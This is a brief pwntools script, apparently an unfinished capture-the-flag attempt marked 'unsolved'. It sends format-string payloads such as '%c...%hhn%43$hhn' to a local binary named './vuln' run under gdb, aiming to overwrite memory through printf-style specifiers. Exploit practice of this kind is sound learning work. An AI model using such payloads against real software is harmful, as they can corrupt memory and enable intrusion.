from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"

elf = ELF("./vuln")
io = gdb.debug('./vuln', 'b *(main+134)\nc')
# io.sendlineafter(
#     b"date?\n",
#     b'%13$hhn123%43$hhn'
# )

io.sendlineafter(
    b"date?\n",
    b'%c%c%c%c%c%c%c%c%c%c%c%c%hhn%43$hhn'
)
io.interactive()
# unsolved
